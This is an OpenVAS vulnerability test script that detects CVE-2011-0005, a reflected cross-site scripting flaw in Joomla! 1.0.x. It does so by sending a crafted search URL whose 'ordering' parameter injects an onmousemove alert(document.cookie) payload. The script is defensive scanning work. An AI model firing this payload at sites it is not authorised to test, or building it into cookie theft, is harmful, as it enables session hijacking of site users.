###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_xss_vuln.nasl 11552 2018-09-22 13:45:08Z cfischer $
#
# Joomla! Cross Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801827");
  script_version("$Revision: 11552 $");
  script_tag(name:"last_modification", value:"$Date: 2018-09-22 15:45:08 +0200 (Sat, 22 Sep 2018) $");
  script_tag(name:"creation_date", value:"2011-01-27 07:47:27 +0100 (Thu, 27 Jan 2011)");
  script_cve_id("CVE-2011-0005");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Joomla! Cross Site Scripting Vulnerability");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/64539");
  script_xref(name:"URL", value:"http://yehg.net/lab/pr0js/advisories/joomla/core/[joomla_1.0.x~15]_cross_site_scripting");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to insert arbitrary HTML and
script code, which will be executed in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"Joomla! versions 1.0.x through 1.0.15");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input via the
'ordering' parameter to 'index.php' which allows attackers to execute arbitrary HTML and script code on the web
server.");

  script_tag(name:"solution", value:"Upgrade to Joomla! 1.5.22 or later.");

  script_tag(name:"summary", value:"The host is running Joomla! and is prone to Cross site scripting
vulnerability.");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/index.php?option=com_search&searchword=xss&searchphrase=" +
            "any&ordering=newest%22%20onmousemove=alert%28document.cookie%29" +
            "%20style=position:fixed;top:0;left:0;width:100%;height:100%;%22";

if (http_vuln_check(port:port, url:url, pattern:'onmousemove=alert(document.cookie)', check_header: TRUE)){
  report = report_vuln_url( port:port, url:url );
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
